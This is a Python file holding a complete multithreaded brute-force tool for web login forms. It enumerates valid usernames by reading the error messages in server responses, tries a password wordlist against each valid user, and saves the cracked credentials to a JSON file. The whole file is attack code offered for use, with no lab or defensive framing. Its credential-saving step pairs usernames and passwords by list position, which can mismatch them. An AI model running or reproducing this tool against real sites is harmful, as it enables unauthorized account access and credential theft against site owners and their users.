import json
import requests
import threading

#
class BruteForcer:
    """
    A class responsible for performing a brute-force attack on a login form.

    It takes the login URL, username file path, and password file path as initialization parameters. 

    It provides methods to:
        * Check individual usernames for validity.
        * Attempt login with username and password combinations.
        * Run checks and brute-forcing using multithreading for efficiency.
        * Find valid usernames and passwords.
        * Save found credentials to a JSON file.
    """

    def __init__(self, url, users_file, passwords_file):
        """
        Initializes a BruteForcer object with the provided login URL, username file path, and password file path.

        Args:
            url (str): The URL of the login form.
            users_file (str): The file path containing a list of usernames.
            passwords_file (str): The file path containing a list of passwords.
        """

        with open(users_file) as uf, open(passwords_file) as pf:
            self.users = uf.readlines()
            self.passwords = pf.readlines()
        self.session = requests.Session()
        self.url = url
        self.valid_usernames = []
        self.valid_passwords = []
        

    def check_username(self, _, username):
        """
        Checks if a given username is valid by attempting to log in with a placeholder password.

        Args:
            _ (any): This argument is not used but is required for the threading function.
            username (str): The username to check.

        Returns:
            bool: True if the username is valid, False otherwise.
        """

        username = username.strip()

        payload = {
            "username": username,
            "password": "LoQueEsYnOeSNoDebeSer146565198",
        }
        response = self.session.post(self.url, data=payload)
        if "Invalid credentials" not in response.text:
            # Agregamos el nombre de usuario a la lista
            self.valid_usernames.append(username)
            return True
        print(f"user: {username} incorrect")
        return False


    def bruteforce(self, username, password):
        """
        Attempts to log in using the provided username and password combination.

        Args:
            username (str): The username to use.
            password (str): The password to use.

        Returns:
            bool: True if the login is successful, False otherwise.
        """

        password = password.strip()

        payload = {
            "username": username,
            "password": password,
        }
        response = self.session.post(self.url, data=payload)
        if "Incorrect password" not in response.text:
            # adding the password in the list
            self.valid_passwords.append(password)
            return True
        print(f"pass: {password} incorrect")
        return False


    def run_threads(self, function, targets, username):
        """
        Creates and starts threads to run a given function concurrently on multiple targets.

        Args:
            function (callable): The function to be run on each thread.
            targets (list): A list of targets for the function.
            username (str): The username to be passed as an argument to the function (if applicable).

        Returns:
            list: A list of created threads.
        """

        threads = []
        for target in targets:
            thread = threading.Thread(target=function, args=(username, target,))
            threads.append(thread)
            thread.start()
        return threads


    def find_valid_usernames(self):
        """
        Attempts to find valid usernames using multithreading.

        Uses the check_username() function on all usernames in the provided file concurrently.
        """

        threads = self.run_threads(self.check_username, self.users, None)
        for thread in threads:
            thread.join()


    def find_valid_passwords(self):
        """
        Attempts to find valid passwords for each valid username using multithreading.

        Uses the bruteforce() function on all password combinations for each valid username concurrently.
        """

        for username in self.valid_usernames:
            threads = self.run_threads(self.bruteforce, self.passwords, username)
            for thread in threads:
                thread.join()


    def save_credentials(self, filename):
        """
        Saves the found valid username and password combinations to a JSON file.

        Args:
            filename (str): The name of the file to save the credentials to.
        """

        credentials = dict(zip(self.valid_usernames, self.valid_passwords))
        with open(filename, 'w') as f:
            json.dump(credentials, f)
